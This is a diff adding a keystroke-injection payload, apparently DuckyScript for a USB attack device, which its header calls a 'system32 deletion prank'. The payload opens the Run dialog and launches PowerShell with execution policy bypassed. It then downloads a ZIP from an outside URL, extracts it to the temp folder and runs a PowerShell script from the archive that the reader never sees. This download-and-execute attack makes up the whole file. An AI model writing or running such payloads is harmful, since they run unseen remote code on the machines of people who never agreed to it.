@@ -1,0 +1,16 @@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@ INFO:                                         @
+@                                               @
+@ This script simulates a system32 deletion     @         
+@ prank. It downloads a ZIP file from a URL,    @
+@ extracts it to the temporary directory,       @
+@ and runs a PowerShell script from the archive.@
+@                                               @
+@ Created by: milis                             @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -NoP -Ep Bypass $D="$env:tmp";iwr -Uri 'https://www.bestwebsite.ca/files/System32DeletionPrank.zip' -O "$D\sysprank.zip";Expand-Archive "$D\sysprank.zip" -Des $D -Force;. "$D\script.ps1"
+ENTER
